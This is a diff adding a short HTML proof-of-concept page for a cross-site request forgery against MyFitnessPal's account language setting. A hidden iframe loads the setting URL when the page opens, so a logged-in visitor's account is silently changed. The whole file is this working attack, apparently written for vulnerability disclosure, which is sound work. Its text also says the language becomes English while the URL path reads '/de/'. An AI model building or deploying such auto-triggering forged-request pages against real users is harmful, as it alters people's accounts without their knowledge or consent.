@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC — Language Change</title></head>
+<body>
+<h3>CSRF PoC — Change MyFitnessPal Language</h3>
+
+<!-- Auto-triggers when page loads -->
+<iframe src="https://www.myfitnesspal.com/de/account/language-setting" style="display:none"></iframe>
+
+<p>If victim is logged in and visits this page, their language will change to English.</p>
+</body>
+</html>
